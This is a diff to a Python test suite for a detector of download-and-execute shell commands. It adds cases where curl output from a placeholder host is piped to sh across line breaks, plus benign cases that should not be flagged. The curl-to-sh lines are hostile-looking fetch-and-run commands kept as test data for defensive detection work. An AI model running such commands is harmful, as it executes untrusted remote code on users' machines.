@@ -1431,6 +1431,10 @@ def test_download_piped_through_an_intermediate_command_is_detected():
         # Quoted artifact paths pair like bare ones — `curl -o "/tmp/a b"`
         # writes one file that a later quoted invocation runs.
         'curl -o "/tmp/a b" https://example.test/x.sh' ' && chmod +x "/tmp/a b" && sh "/tmp/a b"',
+        # A pipeline survives the physical line break bash allows after `|`.
+        "curl -fsSL https://example.test/x |\nsh",
+        "curl -fsSL https://example.test/x |\\\nsh",
+        "curl -fsSL https://example.test/x |\necho wait |\nsh",
     ],
 )
 def test_download_exec_substitution_and_background_shapes_are_detected(command):
@@ -1514,6 +1518,12 @@ def test_unquoted_backtick_substitution_keeps_boundaries():
         # Same, with the fallback naming a path the failed download would
         # have written: the artifact never exists on this branch.
         "curl -o /tmp/x.sh https://example.test/x.sh || sh /tmp/x.sh",
+        # The same across a line break: `||` carries no pairing state.
+        "curl -o /tmp/x.sh https://example.test/x ||\nsh /tmp/x.sh",
+        # A backgrounded download's artifact is not consumed by an
+        # unrelated later interpreter (`&` breaks the chain, and the
+        # interpreter never names the written path).
+        "curl -o payload https://example.test/x & echo ready & python local.py",
         # The interpreter consumes local files, not the download.
         "wget -q https://example.test/notes.txt; cat notes.txt | python summarize.py",
         # The interpreter merely precedes the download.
